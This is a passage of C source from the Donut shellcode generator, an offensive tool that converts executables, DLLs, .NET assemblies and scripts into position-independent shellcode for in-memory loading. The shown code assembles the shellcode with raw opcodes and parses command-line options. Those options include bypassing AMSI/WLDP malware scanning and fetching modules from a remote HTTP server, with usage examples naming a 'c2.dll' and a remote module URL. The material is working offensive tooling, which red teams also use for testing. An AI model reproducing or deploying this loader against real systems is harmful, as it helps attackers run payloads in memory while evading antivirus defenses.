      if((c->arch == DONUT_ARCH_X86  && 
         fi.arch  == DONUT_ARCH_X64) ||
         (c->arch == DONUT_ARCH_X64  &&
         fi.arch  == DONUT_ARCH_X86))
      {
        err = DONUT_ERROR_ARCH_MISMATCH;
        goto cleanup;
      }
      // DLL function specified. Does it exist?
      if(c->mod_type == DONUT_MODULE_DLL &&
         c->method[0] != 0)
      {
        DPRINT("Validating DLL function \"%s\" for DLL", c->method);
        if(!is_dll_export(&fi, c->method)) {
          err = DONUT_ERROR_DLL_FUNCTION;
          goto cleanup;
        }
      }
    }    
    // .NET DLL assembly?
    if(c->mod_type == DONUT_MODULE_NET_DLL) {
      // DLL requires class and method
      if(c->cls[0] == 0 || c->method[0] == 0) {
        err = DONUT_ERROR_NET_PARAMS;
        goto cleanup;
      }
    }
    
    // is this an unmanaged DLL with parameters?
    if(c->mod_type == DONUT_MODULE_DLL &&
       c->param[0] != 0)
    {
      // we need a DLL function
      if(c->method[0] == 0) {
        err = DONUT_ERROR_DLL_PARAM;
        goto cleanup;
      }
    }
    // 1. Create the module
    DPRINT("Creating module");
    err = CreateModule(c, &fi);
    
    if(err != DONUT_ERROR_SUCCESS) 
      goto cleanup;

    // 2. Create the instance
    DPRINT("Creating instance");
    err = CreateInstance(c, &fi);
    
    if(err != DONUT_ERROR_SUCCESS)
      goto cleanup;
    
    // if DEBUG is defined, save instance to disk
    #ifdef DEBUG
      DPRINT("Saving instance to file");
      fd = fopen("instance", "wb");
      
      if(fd != NULL) {
        fwrite(c->inst, 1, c->inst_len, fd);
        fclose(fd);
      }
    #endif
    // 3. If the module will be stored on a remote server
    if(c->inst_type == DONUT_INSTANCE_URL) {
      DPRINT("Saving %s to disk.", c->modname);
      // save the module to disk using random name
      fd = fopen(c->modname, "wb");
      
      if(fd != NULL) {
        fwrite(c->mod, 1, c->mod_len, fd);
        fclose(fd);
      }
    }
    // 4. calculate size of PIC + instance combined
    if(c->arch == DONUT_ARCH_X86) {
      c->pic_len = sizeof(PAYLOAD_EXE_X86) + c->inst_len + 32;
    } else 
    if(c->arch == DONUT_ARCH_X64) {
      c->pic_len = sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
    } else 
    if(c->arch == DONUT_ARCH_X84) {
      c->pic_len = sizeof(PAYLOAD_EXE_X86) + 
                   sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
    }
    // 5. allocate memory for shellcode
    c->pic = malloc(c->pic_len);
    
    DPRINT("PIC size : %" PRIi64, c->pic_len);
    
    if(c->pic == NULL) {
      err = DONUT_ERROR_NO_MEMORY;
      goto cleanup;
    }
    
    DPRINT("Inserting opcodes");
    // 6. insert shellcode
    pl = (uint8_t*)c->pic;
    // call $ + c->inst_len
    PUT_BYTE(pl,  0xE8);
    PUT_WORD(pl,  c->inst_len);
    PUT_BYTES(pl, c->inst, c->inst_len);
    // pop ecx
    PUT_BYTE(pl,  0x59);
    
    // x86?
    if(c->arch == DONUT_ARCH_X86) {
      // pop edx
      PUT_BYTE(pl, 0x5A);
      // push ecx
      PUT_BYTE(pl, 0x51);
      // push edx
      PUT_BYTE(pl, 0x52);
      
      DPRINT("Copying %" PRIi64 " bytes of x86 shellcode", 
        (uint64_t)sizeof(PAYLOAD_EXE_X86));
        
      PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
    } else 
    // AMD64?
    if(c->arch == DONUT_ARCH_X64) {
      
      DPRINT("Copying %" PRIi64 " bytes of amd64 shellcode", 
        (uint64_t)sizeof(PAYLOAD_EXE_X64));
        
      PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
    } else 
    // x86 + AMD64?
    if(c->arch == DONUT_ARCH_X84) {
      
      DPRINT("Copying %" PRIi64 " bytes of x86 + amd64 shellcode",
        (uint64_t)(sizeof(PAYLOAD_EXE_X86) + sizeof(PAYLOAD_EXE_X64)));
        
      // xor eax, eax
      PUT_BYTE(pl, 0x31);
      PUT_BYTE(pl, 0xC0);
      // dec eax
      PUT_BYTE(pl, 0x48);
      // js dword x86_code
      PUT_BYTE(pl, 0x0F);
      PUT_BYTE(pl, 0x88);
      PUT_WORD(pl,  sizeof(PAYLOAD_EXE_X64));
      PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
      // pop edx
      PUT_BYTE(pl, 0x5A);
      // push ecx
      PUT_BYTE(pl, 0x51);
      // push edx
      PUT_BYTE(pl, 0x52);
      PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
    }
cleanup:
    // if there was some error, release resources
    if(err != DONUT_ERROR_SUCCESS) {
      DonutDelete(c);
    }
    unmap_file(&fi);
    DPRINT("Leaving.");
    return err;
}

// release resources allocated for configuration
EXPORT_FUNC 
int DonutDelete(PDONUT_CONFIG c) {
    
    DPRINT("Entering.");
    if(c == NULL) {
      return DONUT_ERROR_INVALID_PARAMETER;
    }
    // free module
    if(c->mod != NULL) {
      free(c->mod);
      c->mod = NULL;
    }
    // free instance
    if(c->inst != NULL) {
      free(c->inst);
      c->inst = NULL;
    }
    // free payload
    if(c->pic != NULL) {
      free(c->pic);
      c->pic = NULL;
    }
    DPRINT("Leaving.");
    return DONUT_ERROR_SUCCESS;
}

// define when building an executable
#ifdef DONUT_EXE

const char *err2str(int err) {
    static const char *str="N/A";
    
    switch(err) {
      case DONUT_ERROR_SUCCESS:
        str = "No error";
        break;
      case DONUT_ERROR_FILE_NOT_FOUND:
        str = "File not found";
        break;
      case DONUT_ERROR_FILE_EMPTY:
        str = "File is empty";
        break;
      case DONUT_ERROR_FILE_ACCESS:
        str = "Cannot open file";
        break;
      case DONUT_ERROR_FILE_INVALID:
        str = "File is invalid";
        break;      
      case DONUT_ERROR_NET_PARAMS:
        str = "File is a .NET DLL. Donut requires a class and method";
        break;
      case DONUT_ERROR_NO_MEMORY:
        str = "No memory available";
        break;
      case DONUT_ERROR_INVALID_ARCH:
        str = "Invalid architecture specified";
        break;      
      case DONUT_ERROR_INVALID_URL:
        str = "Invalid URL";
        break;
      case DONUT_ERROR_URL_LENGTH:
        str = "Invalid URL length";
        break;
      case DONUT_ERROR_INVALID_PARAMETER:
        str = "Invalid parameter";
        break;
      case DONUT_ERROR_RANDOM:
        str = "Error generating random values";
        break;
      case DONUT_ERROR_DLL_FUNCTION:
        str = "Unable to locate DLL function provided. Names are case sensitive";
        break;
      case DONUT_ERROR_ARCH_MISMATCH:
        str = "Target architecture cannot support selected DLL/EXE file";
        break;
      case DONUT_ERROR_DLL_PARAM:
        str = "You've supplied parameters for an unmanaged DLL. Donut also requires a DLL function";
        break;
      case DONUT_ERROR_BYPASS_INVALID:
        str = "Invalid bypass option specified";
        break;
    }
    return str;
}

static char* get_param (int argc, char *argv[], int *i) {
    int n = *i;
    if (argv[n][2] != 0) {
      return &argv[n][2];
    }
    if ((n+1) < argc) {
      *i = n + 1;
      return argv[n+1];
    }
    printf("  [ %c%c requires parameter\n", argv[n][0], argv[n][1]);
    exit (0);
}

static void usage (void) {
    printf(" usage: donut [options] -f <EXE/DLL/VBS/JS/XSL>\n\n");
    
    printf("                   -MODULE OPTIONS-\n\n");
    printf("       -f <path>            .NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory.\n");
    printf("       -u <URL>             HTTP server that will host the donut module.\n\n");

    printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
    printf("       -a <arch>            Target architecture : 1=x86, 2=amd64, 3=amd64+x86(default).\n");
    printf("       -b <level>           Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail.(default)\n");
    printf("       -o <payload>         Output file. Default is \"payload.bin\"\n\n");
    
    printf("                   -DOTNET OPTIONS-\n\n");
    printf("       -c <namespace.class> Optional class name.  (required for .NET DLL)\n");
    printf("       -m <method | api>    Optional method or API name for DLL. (method is required for .NET DLL)\n");
    printf("       -p <arg1,arg2...>    Optional parameters or command line, separated by comma or semi-colon.\n");
    printf("       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n");
    printf("       -d <name>            AppDomain name to create for .NET. Randomly generated by default.\n\n");

    printf(" examples:\n\n");
    printf("    donut -f c2.dll\n");
    printf("    donut -a1 -cTestClass -mRunProcess -pnotepad.exe -floader.dll\n");
    printf("    donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -u http://remote_server.com/modules/\n");
    
    exit (0);
}

int main(int argc, char *argv[]) {
    DONUT_CONFIG c;
    char         opt;
    int          i, err;
    FILE         *fd;
    char         *mod_type, *payload="payload.bin", 
                 *arch_str[3] = { "x86", "AMD64", "x86+AMD64" };
    char         *inst_type[2]= { "PIC", "URL"   };
    
    printf("\n");
    printf("  [ Donut shellcode generator v0.9.2\n");
    printf("  [ Copyright (c) 2019 TheWover, Odzhan\n\n");
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default type is position independent code for dual-mode (x86 + amd64)
    c.inst_type = DONUT_INSTANCE_PIC;
    c.arch      = DONUT_ARCH_X84;
    c.bypass    = DONUT_BYPASS_CONTINUE;  // continues loading even if disabling AMSI/WLDP fails
    
    // parse arguments
    for(i=1; i<argc; i++) {
      // switch?
      if(argv[i][0] != '-' && argv[i][0] != '/') {
        usage();
      }
      opt = argv[i][1];
      
      switch(opt) {
        // target cpu architecture
        case 'a':
          c.arch = atoi(get_param(argc, argv, &i));
          break;
        // bypass options
        case 'b':
          c.bypass = atoi(get_param(argc, argv, &i));
          break;
        // name of domain to use for .NET assembly
        case 'd':
          strncpy(c.domain, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // EXE/DLL/VBS/JS/XSL file to embed in shellcode
        case 'f':
          strncpy(c.file, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // runtime version to use for .NET DLL / EXE
        case 'r':
          strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // URL of remote module
        case 'u': {
          strncpy(c.url, get_param(argc, argv, &i), DONUT_MAX_URL - 2);
          c.inst_type = DONUT_INSTANCE_URL;
          break;
        }
        // class of .NET assembly
        case 'c':
          strncpy(c.cls, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // method of .NET assembly
        case 'm':
          strncpy(c.method, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
          break;
        // output file for payload
        case 'o':
          payload = get_param(argc, argv, &i);
          break;
        // parameters to method or DLL function
        case 'p':
          strncpy(c.param, get_param(argc, argv, &i), sizeof(c.param) - 1);
          break;
        default:
          usage();
          break;
      }
    }
    
    // no file? show usage and exit
    if(c.file[0] == 0) {
      usage();
    }
    
    // generate payload from configuration
    err = DonutCreate(&c);
    
    if(err != DONUT_ERROR_SUCCESS) {
      printf("  [ Error : %s\n", err2str(err));
      return 0;
    }
    
    switch(c.mod_type) {
      case DONUT_MODULE_DLL:
        mod_type = "DLL";
        break;
      case DONUT_MODULE_EXE:
        mod_type = "EXE";
        break;
      case DONUT_MODULE_NET_DLL:
        mod_type = ".NET DLL";
        break;
      case DONUT_MODULE_NET_EXE:
        mod_type = ".NET EXE";
        break;
      case DONUT_MODULE_VBS:
        mod_type = "VBScript";
        break;
      case DONUT_MODULE_JS:
        mod_type = "JScript";
        break;
      case DONUT_MODULE_XSL:
        mod_type = "XSL";
        break;
      default:
        mod_type = "Unrecognized";
        break;
    }
    printf("  [ Instance type : %s\n",     inst_type[c.inst_type - 1]);
    printf("  [ Module file   : \"%s\"\n", c.file  );
    printf("  [ File type     : %s\n",     mod_type);
    
    // if this is a .NET DLL, display the class and method
    if(c.mod_type == DONUT_MODULE_NET_DLL) {
      printf("  [ Class         : %s\n", c.cls   );
      printf("  [ Method        : %s\n", c.method);
    } else
    if(c.mod_type == DONUT_MODULE_DLL) {
      printf("  [ Function      : %s\n", 
        c.method[0] != 0 ? c.method : "DllMain");
    }
    // if parameters supplied, display them
    if(c.param[0] != 0) {
      printf("  [ Parameters    : %s\n", c.param);
    }
    printf("  [ Target CPU    : %s\n", arch_str[c.arch - 1]);
    
    if(c.inst_type == DONUT_INSTANCE_URL) {
      printf("  [ Module name   : %s\n", c.modname);
      printf("  [ Upload to     : %s\n", c.url);
    }
    
    printf("  [ AMSI/WDLP     : %s\n",
      c.bypass == DONUT_BYPASS_SKIP  ? "skip" : 
      c.bypass == DONUT_BYPASS_ABORT ? "abort" : "continue"); 
    
    printf("  [ Shellcode     : \"%s\"\n\n", payload);
    fd = fopen(payload, "wb");
    
    if(fd != NULL) {
      fwrite(c.pic, sizeof(char), c.pic_len, fd);
      fclose(fd);
    } else {
      printf("  [ Error opening \"%s\" for payload.\n", payload);
    }
    // release resources
    DonutDelete(&c);
    return 0;
}
#endif
